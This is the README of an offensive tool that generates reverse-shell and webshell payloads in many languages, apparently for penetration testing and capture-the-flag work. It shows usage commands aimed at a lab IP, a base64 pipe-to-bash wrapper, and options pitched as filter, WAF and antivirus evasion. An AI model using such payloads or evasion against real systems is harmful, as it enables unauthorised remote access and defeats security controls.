# Reverse Shell Factory

Instant copy-paste reverse shell payloads in 15+ languages with encoding for filter bypass. Zero dependencies beyond Python 3.6+ stdlib.

Stop hand-crafting payloads mid-engagement. Just type what you need.

---

## Install

```bash
git clone https://github.com/TheHuskyHacker/rev-shell-generator/
cd revshell-factory
chmod +x revshell.py
sudo ln -s $(pwd)/revshell.py /usr/local/bin/revshell
```

No pip install needed — pure stdlib.

---

## Usage

```bash
# Generate a bash reverse shell
revshell -l bash -i 10.10.15.110 -p 4444

# Auto-detect your tun0 IP
revshell -l bash -p 4444

# Base64-wrapped for filter bypass
revshell -l bash -i 10.10.15.110 -p 4444 --wrap-b64

# URL-encoded (for injection in GET/POST params)
revshell -l nc-mkfifo -i 10.10.15.110 -p 443 --encode url

# PowerShell base64-encoded (evades basic AV)
revshell -l ps-b64 -i 10.10.15.110 -p 4444

# msfvenom command (just prints the command to run)
revshell -l msf-linux -i 10.10.15.110 -p 4444

# Print ALL shells at once for your IP/port
revshell --all -i 10.10.15.110 -p 4444

# Quick reference without specifying a type
revshell -i 10.10.15.110 -p 4444

# TTY stabilization cheatsheet
revshell --stabilize

# Start a listener
revshell --listen -p 4444
revshell --listen -p 4444 --rlwrap

# List everything available
revshell --list
```

---

## Shell Types

| Type | Aliases | Notes |
|------|---------|-------|
| `bash` | `sh` | Most common on Linux |
| `bash-196` | | File descriptor 196 variant |
| `bash-udp` | | Over UDP |
| `nc` | `netcat` | Traditional -e |
| `nc-mkfifo` | `nc-fifo` | Named pipe (works everywhere) |
| `busybox-nc` | `busybox` | BusyBox variant (containers/IoT) |
| `python` | `py`, `python3` | Python3 PTY shell |
| `python-short` | `py-short` | Minimal Python |
| `python-windows` | `py-win` | Windows cmd.exe |
| `php` | | exec() |
| `php-pentestmonkey` | `php-pm` | proc_open() |
| `powershell` | `ps`, `psh` | Full TCP client |
| `powershell-b64` | `ps-b64` | Pre-encoded |
| `powercat` | | Needs powercat.ps1 |
| `perl` | | Socket-based |
| `ruby` | `rb` | TCPSocket |
| `groovy` | | Jenkins/Liferay consoles |
| `socat` | | Full TTY support |
| `node` | `nodejs` | child_process |
| `java` | | Runtime.exec |
| `lua` | | Socket-based |
| `msfvenom-linux` | `msf-linux` | ELF payload |
| `msfvenom-windows` | `msf-win` | EXE payload |
| `msfvenom-aspx` | `msf-aspx` | ASPX payload |
| `msfvenom-war` | `msf-war` | WAR (Tomcat) |
| `msfvenom-dll` | `msf-dll` | DLL (service hijack) |
| `webshell-php` | `ws-php` | GET param webshell |
| `webshell-jsp` | `ws-jsp` | JSP webshell |
| `webshell-aspx` | `ws-aspx` | ASPX webshell |

---

## Encoding Options

| Flag | What it does |
|------|-------------|
| `--encode base64` | Raw base64 of the payload |
| `--encode url` | URL-encode (for GET/POST injection) |
| `--encode double-url` | Double URL-encode (for WAF bypass) |
| `--encode hex` | Hex-encode |
| `--wrap-b64` | Wraps bash/python in `echo X \| base64 -d \| bash` |

---

## Features

- **Auto-detect IP** — reads tun0/eth0 automatically, no `-i` needed on most setups
- **Listener mode** — `--listen` starts nc (with optional rlwrap) so you don't switch terminals
- **TTY stabilization** — `--stabilize` prints the full upgrade cheatsheet
- **All-at-once** — `--all` dumps every shell type for quick copy-paste
- **No dependencies** — pure Python stdlib, works on any box with Python 3.6+

---

## License

MIT
